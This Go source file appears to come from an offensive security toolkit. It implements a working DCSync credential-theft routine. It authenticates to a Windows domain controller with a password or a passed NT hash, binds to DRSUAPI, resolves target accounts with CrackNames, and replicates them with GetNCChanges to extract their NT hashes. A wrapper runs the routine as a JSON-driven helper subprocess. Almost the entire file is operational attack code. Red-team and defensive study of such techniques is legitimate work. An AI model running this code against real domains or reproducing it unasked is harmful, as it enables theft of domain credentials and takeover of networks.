package commands

import (
	"context"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/oiweiwei/go-msrpc/dcerpc"
	"github.com/oiweiwei/go-msrpc/midl/uuid"
	"github.com/oiweiwei/go-msrpc/msrpc/drsr/drsuapi/v4"
	"github.com/oiweiwei/go-msrpc/msrpc/dtyp"
	"github.com/oiweiwei/go-msrpc/msrpc/epm/epm/v3"
	"github.com/oiweiwei/go-msrpc/msrpc/erref/drsr"
	"github.com/oiweiwei/go-msrpc/ndr"
	"github.com/oiweiwei/go-msrpc/ssp"
	sspcred "github.com/oiweiwei/go-msrpc/ssp/credential"
	"github.com/oiweiwei/go-msrpc/ssp/gssapi"
)

type dcsyncHelperArgs struct {
	Server   string   `json:"server"`
	Username string   `json:"username"`
	Password string   `json:"password"`
	Hash     string   `json:"hash"`
	Domain   string   `json:"domain"`
	Targets  []string `json:"targets"`
	Timeout  int      `json:"timeout"`
}

type dcsyncHelperOutput struct {
	Error   string         `json:"error,omitempty"`
	Results []dcsyncResult `json:"results,omitempty"`
}

func RunDcsyncHelper(args []string) {
	if len(args) != 1 {
		out, err := json.Marshal(dcsyncHelperOutput{Error: "expected 1 JSON argument"})
		if err != nil {
			_, _ = fmt.Fprintf(os.Stdout, `{"error":"expected 1 JSON argument"}`+"\n")
			os.Exit(1)
		}
		_, _ = fmt.Fprintln(os.Stdout, string(out))
		os.Exit(1)
	}

	var ha dcsyncHelperArgs
	if err := json.Unmarshal([]byte(args[0]), &ha); err != nil {
		out, marshalErr := json.Marshal(dcsyncHelperOutput{Error: fmt.Sprintf("invalid JSON: %v", err)})
		if marshalErr != nil {
			_, _ = fmt.Fprintf(os.Stdout, `{"error":"invalid JSON: %v"}`+"\n", err)
			os.Exit(1)
		}
		_, _ = fmt.Fprintln(os.Stdout, string(out))
		os.Exit(1)
	}

	results, err := dcsyncNTLMStandalone(ha)
	if err != nil {
		out, marshalErr := json.Marshal(dcsyncHelperOutput{Error: err.Error()})
		if marshalErr != nil {
			_, _ = fmt.Fprintf(os.Stdout, `{"error":"failed to marshal error response"}`+"\n")
			os.Exit(1)
		}
		_, _ = fmt.Fprintln(os.Stdout, string(out))
		os.Exit(1)
	}

	out, err := json.Marshal(dcsyncHelperOutput{Results: results})
	if err != nil {
		_, _ = fmt.Fprintf(os.Stdout, `{"error":"failed to marshal result: %v"}`+"\n", err)
		os.Exit(1)
	}
	_, _ = fmt.Fprintln(os.Stdout, string(out))
}

func dcsyncNTLMStandalone(ha dcsyncHelperArgs) ([]dcsyncResult, error) {
	credUser := ha.Username
	if ha.Domain != "" {
		credUser = ha.Domain + `\` + ha.Username
	}
	var cred sspcred.Credential
	if ha.Hash != "" {
		cred = sspcred.NewFromNTHash(credUser, stripLMPrefix(ha.Hash))
	} else {
		cred = sspcred.NewFromPassword(credUser, ha.Password)
	}

	timeout := time.Duration(ha.Timeout) * time.Second
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	ctx = gssapi.NewSecurityContext(ctx,
		gssapi.WithCredential(cred),
		gssapi.WithMechanismFactory(ssp.SPNEGO),
		gssapi.WithMechanismFactory(ssp.NTLM),
	)

	cc, err := dcerpc.Dial(ctx, "ncacn_ip_tcp:"+ha.Server,
		epm.EndpointMapper(ctx,
			net.JoinHostPort(ha.Server, "135"),
			dcerpc.WithInsecure(),
		),
	)
	if err != nil {
		return nil, fmt.Errorf("DCE-RPC connect: %v", err)
	}
	defer cc.Close(ctx)

	cli, err := drsuapi.NewDrsuapiClient(ctx, cc,
		dcerpc.WithSeal(),
		dcerpc.WithTargetName(ha.Server),
	)
	if err != nil {
		return nil, fmt.Errorf("DRSUAPI client: %v", err)
	}

	clientCaps := drsuapi.ExtensionsInt{
		Flags:   drsuapi.ExtGetNCChangesRequestV8 | drsuapi.ExtStrongEncryption | drsuapi.ExtGetNCChangesReplyV6,
		ExtCaps: 0xFFFFFFFF,
	}
	capsBytes, err := ndr.Marshal(&clientCaps, ndr.Opaque)
	if err != nil {
		return nil, fmt.Errorf("marshal caps: %v", err)
	}

	bindResp, err := cli.Bind(ctx, &drsuapi.BindRequest{
		Client: &drsuapi.Extensions{Data: capsBytes},
	})
	if err != nil {
		return nil, fmt.Errorf("DRSBind: %v", err)
	}

	var crackFormat uint32
	crackTargets := make([]string, len(ha.Targets))
	if ha.Domain != "" {
		netbios := strings.ToUpper(strings.SplitN(ha.Domain, ".", 2)[0])
		crackFormat = uint32(drsuapi.DSNameFormatNT4AccountName)
		for i, t := range ha.Targets {
			crackTargets[i] = netbios + `\` + t
		}
	} else {
		crackFormat = uint32(drsuapi.DSNameFormatNT4AccountNameSANSDomainEx)
		copy(crackTargets, ha.Targets)
	}

	cracked, err := cli.CrackNames(ctx, &drsuapi.CrackNamesRequest{
		Handle:    bindResp.DRS,
		InVersion: 1,
		In: &drsuapi.MessageCrackNamesRequest{
			Value: &drsuapi.MessageCrackNamesRequest_V1{
				V1: &drsuapi.MessageCrackNamesRequestV1{
					FormatOffered: crackFormat,
					Names:         crackTargets,
					FormatDesired: uint32(drsuapi.DSNameFormatUniqueIDName),
				},
			},
		},
	})
	if err != nil {
		return nil, fmt.Errorf("DRSCrackNames: %v", err)
	}

	crackedReply, ok := cracked.Out.GetValue().(*drsuapi.MessageCrackNamesReplyV1)
	if !ok || crackedReply == nil {
		return nil, fmt.Errorf("unexpected CrackNames response type")
	}

	var results []dcsyncResult
	for i, item := range crackedReply.Result.Items {
		if item.Status != 0 {
			results = append(results, dcsyncResult{
				Username: ha.Targets[i],
				NTHash:   fmt.Sprintf("CrackNames failed: %v", drsr.FromCode(int32(item.Status))),
			})
			continue
		}

		nc, err := cli.GetNCChanges(ctx, &drsuapi.GetNCChangesRequest{
			Handle:    bindResp.DRS,
			InVersion: 8,
			In: &drsuapi.MessageGetNCChangesRequest{
				Value: &drsuapi.MessageGetNCChangesRequest_V8{
					V8: &drsuapi.MessageGetNCChangesRequestV8{
						MaxObjectsCount: 1,
						NC: &drsuapi.DSName{
							GUID: dtyp.GUIDFromUUID(uuid.MustParse(item.Name)),
						},
						Flags:             drsuapi.InitSync | drsuapi.GetAncestor | drsuapi.GetAllGroupMembership | drsuapi.WritableReplica,
						ExtendedOperation: drsuapi.ExtendedOperationReplicationObject,
					},
				},
			},
		})
		if err != nil {
			results = append(results, dcsyncResult{
				Username: ha.Targets[i],
				NTHash:   fmt.Sprintf("GetNCChanges failed: %v", err),
			})
			continue
		}

		result := dcsyncParseReply(cli, nc, ha.Targets[i])
		if result != nil {
			results = append(results, *result)
		}
	}

	return results, nil
}

func dcsyncViaSubprocess(args dcsyncArgs, targets []string) ([]dcsyncResult, error) {
	selfPath, err := os.Executable()
	if err != nil {
		return nil, fmt.Errorf("cannot find self: %v", err)
	}

	ha := dcsyncHelperArgs{
		Server:   args.Server,
		Username: args.Username,
		Password: args.Password,
		Hash:     args.Hash,
		Domain:   args.Domain,
		Targets:  targets,
		Timeout:  args.Timeout,
	}
	argsJSON, err := json.Marshal(ha)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal request: %v", err)
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(args.Timeout+10)*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, selfPath, "--dcsync-helper", string(argsJSON))
	output, err := cmd.Output()
	if err != nil {
		if len(output) > 0 {
			var ho dcsyncHelperOutput
			if json.Unmarshal(output, &ho) == nil && ho.Error != "" {
				return nil, fmt.Errorf("%s", ho.Error)
			}
		}
		return nil, fmt.Errorf("subprocess: %v", err)
	}

	var ho dcsyncHelperOutput
	if err := json.Unmarshal(output, &ho); err != nil {
		return nil, fmt.Errorf("parse output: %v", err)
	}
	if ho.Error != "" {
		return nil, fmt.Errorf("%s", ho.Error)
	}
	return ho.Results, nil
}
